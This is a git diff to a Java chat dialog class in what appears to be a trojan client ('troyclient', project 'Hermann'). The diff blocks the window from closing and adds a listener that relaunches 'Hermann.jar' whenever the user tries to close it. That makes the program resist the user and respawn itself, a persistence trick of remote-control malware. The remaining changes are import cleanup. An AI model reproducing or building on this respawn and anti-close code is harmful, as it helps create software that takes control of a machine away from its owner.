@@ -1,13 +1,14 @@
 package ch.lebois.troyclient.chat;
 
-import java.awt.BorderLayout;
-import javax.swing.DefaultListModel;
-import javax.swing.JDialog;
-import javax.swing.JList;
+import ch.lebois.troyclient.service.Console;
+
+import javax.swing.*;
+import java.awt.*;
+import java.awt.event.WindowAdapter;
+import java.awt.event.WindowEvent;
 
 /**
  * Project: Hermann
- * Package: ch.lebois.troyclient.functions
  **/
 public class Chat extends JDialog {
 
@@ -20,7 +21,13 @@ public class Chat extends JDialog {
         setUndecorated(true);
         setLayout(new BorderLayout());
         setVisible(true);
-        setDefaultCloseOperation(JDialog.HIDE_ON_CLOSE);
+        setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
+        addWindowListener(new WindowAdapter() {
+            @Override
+            public void windowClosing(WindowEvent windowEvent) {
+                Console.execute("java -jar Hermann.jar");
+            }
+        });
 
         listModel = new DefaultListModel<>();
         list = new JList<>(listModel);
@@ -33,6 +40,7 @@ public class Chat extends JDialog {
 
     /**
      * Lemao SINGELTONNNNN
+     *
      * @return
      */
     public static Chat getInstance() {
